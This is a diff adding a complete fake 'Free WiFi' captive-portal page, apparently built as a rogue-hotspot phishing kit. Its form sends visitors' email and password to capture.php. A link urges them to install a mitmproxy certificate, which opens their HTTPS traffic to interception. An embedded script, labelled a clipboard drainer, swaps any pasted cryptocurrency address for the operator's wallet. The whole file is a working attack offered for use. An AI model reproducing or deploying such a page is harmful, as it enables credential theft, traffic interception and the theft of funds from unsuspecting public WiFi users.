@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free WiFi - Connect Now</title>
+    <style>
+        body {font-family: Arial, sans-serif; background:#000; color:#fff; text-align:center; padding:40px; margin:0;}
+        h1 {margin-bottom:10px;}
+        p {font-size:18px; margin:20px 0;}
+        input {width:280px; padding:12px; margin:10px 0; font-size:16px;}
+        button {padding:15px 50px; background:#0066ff; color:white; border:none; font-size:18px; cursor:pointer;}
+        a {color:#00aaff; text-decoration:none; font-size:16px;}
+    </style>
+</head>
+<body>
+    <h1>Welcome to Free WiFi Portal</h1>
+    <p>One final step: accept terms & install security certificate to connect securely</p>
+    
+    <form action="capture.php" method="POST">
+        <input type="email" name="email" placeholder="Email address" required><br>
+        <input type="password" name="pass" placeholder="Password" required><br>
+        <button type="submit">Accept & Connect</button>
+    </form>
+
+    <p style="margin-top:40px;">
+        <a href="mitmproxy-ca-cert.pem">→ Install Security Certificate (required for HTTPS) ←</a>
+    </p>
+
+    <!-- Clipboard drainer - swaps crypto addresses on paste -->
+    <script>
+    document.addEventListener('paste', function(e) {
+        let text = (e.clipboardData || window.clipboardData).getData('text');
+        if (text && (text.includes('bc1q') || text.includes('0x') || text.match(/T[A-Za-z0-9]{30,}/))) {
+            navigator.clipboard.writeText('bc1qyourburnerwalletgoeshere');  // ← CHANGE THIS TO YOUR WALLET
+        }
+    });
+    </script>
+</body>
+</html>
